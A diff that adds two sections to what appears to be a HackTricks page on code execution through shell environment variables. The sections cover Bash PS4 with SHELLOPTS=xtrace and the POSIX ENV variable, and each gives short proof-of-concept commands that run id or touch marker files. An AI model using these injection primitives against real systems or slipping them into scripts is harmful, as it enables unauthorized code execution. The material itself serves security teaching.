@@ -49,11 +49,39 @@ XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
 
 Use `fish --no-config` for a trusted invocation and clear untrusted XDG path variables.
 
+## bash `PS4` + xtrace (`SHELLOPTS`)
+
+When Bash runs with the **xtrace** option, before every traced command it expands `PS4` and prints it. `PS4` is expanded like any prompt, so a **command substitution** inside it is executed. Both the value of `PS4` **and** the way xtrace is enabled can come purely from the environment: exporting `SHELLOPTS=xtrace` turns xtrace on for a normal `bash script.sh` (no `-x` flag needed). This turns any Bash script the victim runs into code execution.<sup>[[5]](#references)</sup>
+
+```bash
+echo 'x=1; echo done' > /tmp/victim.sh
+
+# Pure environment-variable injection (no -x on the command line)
+SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
+cat /tmp/ps4-executed
+
+# Same primitive when a maintenance/CI job is run with debugging on
+PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
+```
+
+`PS4` alone does nothing until xtrace is enabled (via `SHELLOPTS=xtrace`, `set -x`, or `bash -x`). Bash ignores `SHELLOPTS` in **privileged mode** (differing real/effective IDs without `-p` handling), so the same setuid caveats as `BASH_ENV` apply.
+
+## POSIX `ENV`
+
+The POSIX-style shells (`/bin/sh`, `dash`, `ksh`) read the `ENV` variable, expand it and source the resulting file when they start an **interactive** shell. It is the POSIX counterpart of `BASH_ENV` (which fires for *non-interactive* Bash), so control of `ENV` executes code whenever a victim spawns an interactive `sh`/`dash`.
+
+```bash
+echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
+echo 'exit' | ENV=/tmp/env-hook.sh dash -i
+test -e /tmp/env-executed && echo 'ENV executed'
+```
+
 ## References
 
 - [1] [Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
 - [2] [Bash Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [3] [zsh Startup/Shutdown Files](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
 - [4] [fish Configuration files](https://fishshell.com/docs/current/language.html#configuration-files)
+- [5] [Bash Variables — `PS4` and the Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
